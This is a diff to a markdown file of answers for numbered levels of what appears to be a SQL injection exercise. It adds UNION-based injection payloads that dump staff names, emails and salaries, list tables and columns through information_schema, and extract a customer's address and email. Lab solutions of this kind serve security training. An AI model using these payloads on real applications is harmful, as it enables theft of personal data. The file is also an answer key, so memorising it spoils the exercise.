@@ -62,13 +62,33 @@ LIMIT 1 OFFSET 0;--
 # Level 7
 
 ```postgresql
-'' UNION SELECT name, email, salary, employed_since FROM staff--
+'' UNION
+SELECT name, email, salary, employed_since
+FROM staff--
 ```
 
 # Level 8
 
 ```postgresql
 '' UNION
-SELECT table_name
-FROM information_schema.tables;--
+SELECT table_name, table_type, table_rows
+FROM information_schema.tables--
+```
+
+# Level 9
+
+```postgresql
+'' UNION
+SELECT table_name, column_name, data_type
+FROM information_schema.columns
+WHERE table_name='customers'--
+```
+
+# Level 10
+
+```postgresql
+product_id=null UNION
+SELECT address, name, email
+FROM customers
+WHERE customer_id=3
 ```
